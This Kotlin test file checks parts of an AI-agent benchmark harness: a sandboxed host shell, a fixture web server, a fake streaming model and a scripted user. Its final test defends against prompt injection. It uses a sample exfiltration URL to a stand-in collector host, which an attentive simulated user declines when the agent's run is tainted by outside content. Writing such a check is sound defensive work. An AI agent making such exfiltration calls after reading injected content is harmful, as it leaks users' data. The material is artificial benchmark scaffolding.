package dev.locus.bench

import dev.locus.core.agent.tools.QuestionAnswer
import kotlinx.serialization.json.jsonObject
import org.junit.Test
import java.io.File
import java.net.HttpURLConnection
import java.net.URI
import java.nio.file.Files
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/** The host shell, the fixture web server, the fake model's wire format and the scripted user. */
class HarnessPartsTest {
    private val dir: File = Files.createTempDirectory("harness-test").toFile()
    private val workspace = File(dir, "ws").apply { mkdirs() }
    private val shell = HostShell(workspace, File(dir, "trial"))

    @Test
    fun `workspace paths map to the trial folder`() {
        assertEquals("cd ${workspace.path}/src && ls ${workspace.path}", shell.mapPaths("cd /workspace/src && ls /workspace"))
        assertEquals("cat '${workspace.path}/a b'", shell.mapPaths("cat '/workspace/a b'"))
        // Not a whole path segment: left alone.
        assertEquals("ls /workspaces /x/workspace ~/workspace", shell.mapPaths("ls /workspaces /x/workspace ~/workspace"))
        assertEquals(workspace, shell.resolveCwd("/workspace"))
        File(workspace, "sub").mkdirs()
        assertEquals(File(workspace, "sub"), shell.resolveCwd("/workspace/sub"))
        assertEquals(workspace, shell.resolveCwd("/workspace/missing"))
    }

    @Test
    fun `commands get a rebuilt environment without the harness's variables`() {
        val keys = shell.environment.keys
        assertEquals(setOf("HOME", "TMPDIR", "PATH", "LANG", "LC_ALL", "TERM", "USER", "GIT_CONFIG_NOSYSTEM", "PYTHONDONTWRITEBYTECODE", "NO_COLOR"), keys)
        val out = shell.run("env").output
        assertFalse(out.contains(BenchConfig.KEY_ENV))
        assertTrue(out.lines().any { it == "HOME=${File(dir, "trial/home").path}" }, out)
        // A real Process sees the same through the CommandHost.
        val p = shell.process("pwd", "/workspace").redirectErrorStream(true).start()
        assertEquals(workspace.canonicalPath, File(p.inputStream.bufferedReader().readText().trim()).canonicalPath)
    }

    @Test
    fun `apk add succeeds only for tools the host has`() {
        assertEquals(0, shell.run("apk add git").exitCode)
        val missing = shell.run("apk add definitely-not-a-real-tool-xyz")
        assertEquals(1, missing.exitCode)
        assertTrue(missing.output.contains("not available on the benchmark host"))
        assertEquals(0, shell.run("apk update").exitCode)
    }

    private fun get(url: String, host: String, method: String = "GET", body: String? = null): Pair<Int, String> {
        val c = URI(url).toURL().openConnection() as HttpURLConnection
        c.instanceFollowRedirects = false
        c.requestMethod = method
        c.setRequestProperty("Host", host)
        if (body != null) {
            c.doOutput = true
            c.outputStream.use { it.write(body.toByteArray()) }
        }
        val code = c.responseCode
        val text = (if (code >= 400) c.errorStream else c.inputStream)?.bufferedReader()?.readText().orEmpty()
        return code to (if (code in 300..399) c.getHeaderField("Location") else text)
    }

    @Test
    fun `fixture web server serves sites, redirects, canned posts and records everything`() {
        System.setProperty("sun.net.http.allowRestrictedHeaders", "true")
        val site = File(dir, "site").apply { mkdirs() }
        File(site, "index.html").writeText("<h1>home</h1>")
        File(site, "_redirects").writeText("/old /new.html\n")
        File(site, "_post/api").mkdirs()
        File(site, "_post/api/orders.json").writeText("{\"order\":\"ORD-1\"}")
        File(site, "v1").mkdirs()
        File(site, "v1/data").writeText("{\"a\":1}")
        FixtureWeb(mapOf("shop.bench.test" to site)).use { web ->
            val base = "http://127.0.0.1:${web.port}"
            assertEquals(200 to "<h1>home</h1>", get("$base/", "shop.bench.test"))
            assertEquals(301 to "/new.html", get("$base/old", "shop.bench.test"))
            assertEquals(200 to "{\"order\":\"ORD-1\"}", get("$base/api/orders", "shop.bench.test", "POST", "{\"sku\":1}"))
            assertEquals(404, get("$base/_redirects", "shop.bench.test").first)
            assertEquals(404, get("$base/", "other.bench.test").first)
            assertEquals(200, get("$base/v1/data", "shop.bench.test").first)
            assertEquals(listOf("GET", "GET", "POST", "GET", "GET", "GET"), web.received.map { it.method })
            assertEquals("{\"sku\":1}", web.received[2].body)
            assertEquals("other.bench.test", web.received[4].host)
        }
    }

    @Test
    fun `the fake model streams the oracle's turn for the step it's on`() {
        val oracle = BenchJson.decodeFromString(
            Oracle.serializer(),
            """{"turns":[{"calls":[{"tool":"read_file","args":{"path":"{{site:x.bench.test}}"}}]},{"text":"all done"}]}""",
        )
        val fake = FakeModel("Fix the bug please", oracle, Placeholders(mapOf("site:x.bench.test" to "http://x.bench.test:9")))
        fun ask(assistants: Int, user: String = "Fix the bug please"): String {
            val history = (1..assistants).joinToString("") { ",{\"role\":\"assistant\",\"content\":\"\"},{\"role\":\"tool\",\"content\":\"r\"}" }
            val body = """{"messages":[{"role":"system","content":"s"},{"role":"user","content":"$user"}$history],"stream":true}"""
            return fake.handle(FixtureWeb.Request("POST", FixtureWeb.LLM_HOST, "/v1/chat/completions", null, body)).body
        }
        val first = ask(0)
        assertTrue(first.contains("\"name\":\"read_file\""), first)
        assertTrue(first.contains("http://x.bench.test:9"), first)
        assertTrue(first.contains("\"finish_reason\":\"tool_calls\""))
        assertTrue(first.contains("\"usage\""))
        assertTrue(ask(1).contains("all done"))
        assertTrue(ask(2).contains("Done."))
        assertTrue(ask(0, user = "a helper's task").contains("no script"))
        // Every data line is valid JSON (or the end marker).
        first.lines().filter { it.startsWith("data: ") && it != "data: [DONE]" }
            .forEach { BenchJson.parseToJsonElement(it.removePrefix("data: ")).jsonObject }
        val none = FakeModel("p", null, Placeholders(emptyMap()))
        assertTrue(none.handle(FixtureWeb.Request("POST", FixtureWeb.LLM_HOST, "/v1/chat/completions", null, """{"messages":[{"role":"user","content":"p"}]}""")).body.contains("no oracle"))
    }

    @Test
    fun `scripted user answers by rule, then the first option`() {
        val spec = ScriptedUserSpec(answers = listOf(AnswerRule("environment", "Production")))
        assertEquals(QuestionAnswer(chosen = listOf("production")), ScriptedUser.answer(spec, "Which ENVIRONMENT?", listOf("staging", "production")))
        assertEquals(QuestionAnswer(text = "Production"), ScriptedUser.answer(spec, "Which environment?", emptyList()))
        assertEquals(QuestionAnswer(chosen = listOf("a")), ScriptedUser.answer(spec, "Colour?", listOf("a", "b")))
        assertEquals(QuestionAnswer(text = "Use your judgement."), ScriptedUser.answer(spec, "Colour?", emptyList()))
    }

    @Test
    fun `an attentive user declines tainted calls unless they match the task`() {
        val spec = ScriptedUserSpec(attentive = true, expected = listOf(CallPattern("fetch_url", listOf("shop.bench.test", "/api/orders"))))
        val order = """{"url":"http://shop.bench.test:1/api/orders","method":"POST"}"""
        val exfil = """{"url":"http://collect.bench.test/c?d=x"}"""
        assertTrue(ScriptedUser.approve(spec, "fetch_url", order, tainted = true))
        assertFalse(ScriptedUser.approve(spec, "fetch_url", exfil, tainted = true))
        assertTrue(ScriptedUser.approve(spec, "fetch_url", exfil, tainted = false))
        assertTrue(ScriptedUser.approve(ScriptedUserSpec(), "fetch_url", exfil, tainted = true))
        assertTrue(ScriptedUser.isTaintPrompt("GET x\nTainted run: it has read outside content"))
    }
}
